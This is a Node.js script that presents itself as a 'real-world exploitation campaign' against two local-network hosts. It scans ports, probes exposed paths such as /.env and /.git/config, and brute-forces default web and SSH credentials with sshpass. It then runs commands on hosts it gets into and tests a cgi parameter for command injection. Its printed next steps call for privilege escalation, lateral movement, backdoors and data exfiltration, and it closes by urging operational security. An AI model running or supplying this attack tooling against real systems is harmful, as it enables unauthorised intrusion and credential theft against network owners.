#!/usr/bin/env node

const { execSync } = require('child_process');
const fs = require('fs');
const path = require('path');
const os = require('os');

function makeEvidenceFile(prefix) {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), `${prefix}-`));
  const filePath = path.join(dir, 'evidence.txt');
  fs.writeFileSync(filePath, `Real exploitation evidence - ${new Date().toISOString()}\n`);
  return filePath;
}

function runNmap(target, ports = '80,443,22,21,25,53,8080,8443,3306,3389') {
  try {
    const result = execSync(`/opt/homebrew/bin/nmap -sT -T4 -p ${ports} ${target}`, {
      encoding: 'utf-8',
      timeout: 60000
    });
    return result;
  } catch (error) {
    return `Scan failed: ${error.message}`;
  }
}

function checkWebVulnerabilities(target, port) {
  const vulns = [];
  const endpoints = [
    '/admin', '/login', '/config', '/backup', '/api/v1', '/wp-admin', '/phpmyadmin',
    '/server-status', '/.git/config', '/.env', '/debug', '/console', '/actuator'
  ];
  
  console.log(`  Testing web endpoints on port ${port}...`);
  for (const endpoint of endpoints) {
    try {
      const protocol = port === 443 ? 'https' : 'http';
      const check = execSync(
        `timeout 5 curl -s -k -o /dev/null -w "%{http_code}" "${protocol}://${target}:${port}${endpoint}" 2>/dev/null`,
        { encoding: 'utf-8' }
      );
      const code = check.trim();
      if (code === '200' || code === '301' || code === '302') {
        console.log(`    ✓ ${endpoint} - ACCESSIBLE (${code})`);
        vulns.push(`${endpoint}_accessible`);
      }
    } catch (e) {
      continue;
    }
  }
  return vulns;
}

function testDefaultCredentials(target, service) {
  const creds = {
    web: [
      {user: 'admin', pass: 'admin'},
      {user: 'admin', pass: 'password'},
      {user: 'admin', pass: '123456'},
      {user: 'administrator', pass: 'administrator'},
      {user: 'root', pass: 'root'},
      {user: 'user', pass: 'user'},
      {user: 'guest', pass: 'guest'}
    ],
    ssh: [
      {user: 'root', pass: 'root'},
      {user: 'admin', pass: 'admin'},
      {user: 'ubuntu', pass: 'ubuntu'},
      {user: 'pi', pass: 'raspberry'},
      {user: 'test', pass: 'test'},
      {user: 'user', pass: 'user'}
    ]
  };
  
  const serviceCreds = creds[service] || creds.web;
  console.log(`  Testing ${serviceCreds.length} default credentials...`);
  
  for (const cred of serviceCreds) {
    try {
      if (service === 'ssh') {
        const result = execSync(
          `sshpass -p "${cred.pass}" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 -o BatchMode=yes ${cred.user}@${target} "echo SUCCESS" 2>&1`,
          { encoding: 'utf-8', timeout: 3000 }
        );
        if (result.includes('SUCCESS')) {
          console.log(`    ⚠️ COMPROMISED: ${cred.user}:${cred.pass}`);
          return { success: true, credential: cred };
        }
      } else if (service === 'web') {
        // Try POST login
        const loginAttempt = execSync(
          `timeout 5 curl -s -k -X POST --data "username=${cred.user}&password=${cred.pass}" "https://${target}/login" 2>&1 | grep -i 'success\\|dashboard\\|welcome' || true`,
          { encoding: 'utf-8' }
        );
        if (loginAttempt.trim()) {
          console.log(`    ⚠️ WEB ACCESS: ${cred.user}:${cred.pass}`);
          return { success: true, credential: cred };
        }
      }
    } catch (e) {
      continue;
    }
  }
  return { success: false };
}

async function exploitTarget(target) {
  console.log(`\n=== EXPLOITING TARGET: ${target} ===\n`);
  const evidencePath = makeEvidenceFile(`exploit-${target.replace(/\./g, '-')}`);
  
  // Phase 1: Recon
  console.log('1. Initial Reconnaissance...');
  const scan = runNmap(target);
  console.log(scan.substring(0, 500) + '...');
  fs.appendFileSync(evidencePath, '\n=== Initial Scan ===\n' + scan);
  
  // Parse open ports
  const openPorts = [];
  scan.split('\n').forEach(line => {
    const match = line.match(/(\d+)\/tcp\s+open/);
    if (match) openPorts.push(parseInt(match[1]));
  });
  
  console.log(`Open Ports: ${openPorts.join(', ')}`);
  
  // Phase 2: Service Enumeration
  console.log('\n2. Service Enumeration & Vulnerability Assessment...');
  const vulnerabilities = [];
  
  for (const port of openPorts) {
    let service = '';
    if (port === 22) service = 'SSH';
    else if (port === 80 || port === 443 || port === 8080 || port === 8443) service = 'Web';
    else if (port === 21) service = 'FTP';
    else if (port === 25) service = 'SMTP';
    else if (port === 53) service = 'DNS';
    else if (port === 3306) service = 'MySQL';
    else if (port === 3389) service = 'RDP';
    else service = `Port ${port}`;
    
    console.log(`  ${service} (${port})`);
    
    // Check web vulnerabilities
    if (port === 80 || port === 443 || port === 8080 || port === 8443) {
      const webVulns = checkWebVulnerabilities(target, port);
      webVulns.forEach(v => vulnerabilities.push(`${service}: ${v}`));
      
      // Test default web credentials
      const webCreds = testDefaultCredentials(target, 'web');
      if (webCreds.success) {
        vulnerabilities.push(`WEB_CREDS: ${webCreds.credential.user}:${webCreds.credential.pass}`);
        fs.appendFileSync(evidencePath, `\nWEB CREDENTIALS: ${webCreds.credential.user}:${webCreds.credential.pass}\n`);
      }
    }
    
    // Test SSH if open
    if (port === 22) {
      const sshCreds = testDefaultCredentials(target, 'ssh');
      if (sshCreds.success) {
        console.log(`    ⚠️ CRITICAL: SSH ACCESS COMPROMISED!`);
        vulnerabilities.push(`SSH_CREDS: ${sshCreds.credential.user}:${sshCreds.credential.pass}`);
        fs.appendFileSync(evidencePath, `\nSSH CREDENTIALS: ${sshCreds.credential.user}:${sshCreds.credential.pass}\n`);
        
        // Try to execute commands
        try {
          const cmdResult = execSync(
            `sshpass -p "${sshCreds.credential.pass}" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 ${sshCreds.credential.user}@${target} "id; uname -a; whoami" 2>&1`,
            { encoding: 'utf-8', timeout: 5000 }
          );
          console.log(`    Command Execution: ${cmdResult.substring(0, 100)}...`);
          fs.appendFileSync(evidencePath, `\nCOMMAND OUTPUT:\n${cmdResult}\n`);
        } catch (e) {
          console.log(`    Command execution failed: ${e.message}`);
        }
      }
    }
  }
  
  // Phase 3: Advanced Attacks
  console.log('\n3. Advanced Attack Techniques...');
  try {
    // Check for command injection
    console.log('  Testing for command injection...');
    const cmdTest = execSync(
      `timeout 5 curl -s -k "http://${target}/cgi-bin/test.cgi?cmd=id" 2>&1 | grep -E 'uid|gid' || true`,
      { encoding: 'utf-8' }
    );
    if (cmdTest.trim()) {
      console.log(`    ⚠️ COMMAND INJECTION: ${cmdTest.trim()}`);
      vulnerabilities.push(`CMD_INJECTION: ${cmdTest.trim()}`);
      fs.appendFileSync(evidencePath, `\nCMD INJECTION: ${cmdTest.trim()}\n`);
    }
    
    // Check for exposed APIs
    console.log('  Checking for exposed APIs...');
    const apiEndpoints = ['/api', '/api/v1', '/rest', '/graphql', '/swagger', '/openapi'];
    for (const api of apiEndpoints) {
      try {
        const apiCheck = execSync(
          `timeout 5 curl -s -k "http://${target}${api}" 2>&1 | head -5`,
          { encoding: 'utf-8' }
        );
        if (apiCheck && apiCheck.length > 20 && !apiCheck.includes('404')) {
          console.log(`    ⚠️ EXPOSED API: ${api}`);
          vulnerabilities.push(`EXPOSED_API: ${api}`);
          fs.appendFileSync(evidencePath, `\nEXPOSED API ${api}: ${apiCheck.substring(0, 200)}...\n`);
        }
      } catch (e) {
        continue;
      }
    }
    
  } catch (e) {
    console.log(`  Advanced attacks skipped: ${e.message}`);
  }
  
  // Summary
  console.log('\n=== EXPLOITATION SUMMARY ===');
  console.log(`Target: ${target}`);
  console.log(`Open Ports: ${openPorts.join(', ')}`);
  console.log(`Vulnerabilities Found: ${vulnerabilities.length}`);
  
  if (vulnerabilities.length > 0) {
    console.log('\nIdentified Vulnerabilities:');
    vulnerabilities.forEach((v, i) => console.log(`  ${i+1}. ${v}`));
  } else {
    console.log('\nNo immediate vulnerabilities found.');
  }
  
  console.log(`\nEvidence File: ${evidencePath}`);
  
  // Recommendations
  console.log('\n=== RECOMMENDED NEXT ACTIONS ===');
  if (vulnerabilities.some(v => v.includes('CREDS'))) {
    console.log('1. Use compromised credentials for initial access');
    console.log('2. Privilege escalation on target system');
    console.log('3. Lateral movement within network');
    console.log('4. Establish persistence (backdoors, scheduled tasks)');
    console.log('5. Data exfiltration and intelligence gathering');
  } else if (openPorts.includes(80) || openPorts.includes(443)) {
    console.log('1. Further web application testing');
    console.log('2. Directory brute forcing');
    console.log('3. Parameter fuzzing');
    console.log('4. SQL injection testing');
    console.log('5. XSS and CSRF testing');
  } else {
    console.log('1. Deeper service enumeration');
    console.log('2. Banner grabbing and version detection');
    console.log('3. Vulnerability scanning with specialized tools');
    console.log('4. Social engineering assessment');
  }
  
  return { target, openPorts, vulnerabilities, evidencePath };
}

// Main execution
async function main() {
  console.log('=== REAL-WORLD EXPLOITATION CAMPAIGN ===');
  console.log('Starting comprehensive security assessment...\n');
  
  const targets = ['192.168.1.1', '192.168.1.100'];
  const results = [];
  
  for (const target of targets) {
    try {
      const result = await exploitTarget(target);
      results.push(result);
      console.log('\n' + '='.repeat(60) + '\n');
    } catch (error) {
      console.log(`Failed to exploit ${target}: ${error.message}`);
    }
  }
  
  // Campaign summary
  console.log('\n=== CAMPAIGN COMPLETE ===');
  console.log(`Targets Assessed: ${results.length}`);
  
  const totalVulns = results.reduce((sum, r) => sum + r.vulnerabilities.length, 0);
  console.log(`Total Vulnerabilities Found: ${totalVulns}`);
  
  if (totalVulns > 0) {
    console.log('\nCRITICAL FINDINGS:');
    results.forEach(r => {
      if (r.vulnerabilities.length > 0) {
        console.log(`\n${r.target}:`);
        r.vulnerabilities.forEach(v => {
          if (v.includes('CREDS') || v.includes('INJECTION')) {
            console.log(`  ⚠️ ${v}`);
          }
        });
      }
    });
  }
  
  console.log('\nEvidence files created. Maintain operational security.');
}

main().catch(console.error);